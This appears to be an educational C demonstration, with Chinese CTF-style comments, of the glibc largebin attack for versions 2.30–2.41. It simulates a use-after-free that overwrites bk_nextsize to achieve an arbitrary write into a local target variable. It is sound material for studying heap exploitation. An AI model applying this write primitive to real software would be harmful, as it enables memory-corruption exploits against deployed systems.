/*
 * 中文导读（CTF 版）
 *
 * 手法：large_bin_attack
 * 文件标注范围：2.30 ~ 2.41
 * 模拟漏洞：UAF 改写已入 largebin 节点的 bk_nextsize。
 * 核心流程：插入更小 victim 时走最小节点分支，将 victim 地址写入 fake->fd_nextsize 指向的目标。
 * 成功判据：target 等于新 victim 的 chunk 头；2.30 前后所需链字段不同，2.42 新增 nextsize 反向检查后经典写原语失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

这是针对 glibc 2.30 及以后版本重新设计的 largebin attack。

下面摘录与本攻击直接相关的源码分支：

	以下条件判断新节点是否比 largebin 尾部节点更小：if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}

*/

int main(){
  /* 禁用三个标准流的缓冲，避免 stdio 在后台分配内存并扰动本例堆布局。 */
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  size_t target = 0;

  // p1 比 p2 大 0x10；guard 防止两个 large chunk 在释放时相互合并。
  size_t *p1 = malloc(0x428);

  size_t *g1 = malloc(0x18);

  size_t *p2 = malloc(0x418);

  size_t *g2 = malloc(0x18);

  free(p1);

  // 申请更大的块，迫使 p1 从 unsorted bin 转入 largebin。
  size_t *g3 = malloc(0x438);

  // p2 留在 unsorted bin，稍后插入已有 p1 的 largebin。
  free(p2);

  /* 漏洞模拟：p1[3] 对应 chunk 的 bk_nextsize。
     插入最小节点时会向 bk_nextsize+0x20 写入 p2 的 chunk 头，因此减去 4 个 size_t。 */
  p1[3] = (size_t)((&target)-4);

  // 再次扫描 unsorted bin，触发 p2 的 largebin 插入和目标写入。
  size_t *g4 = malloc(0x438);

  // 目标必须精确等于 p2 的 chunk 头；仅非零不足以证明写入值正确。
  assert((size_t)(p2-2) == target);

  return 0;
}
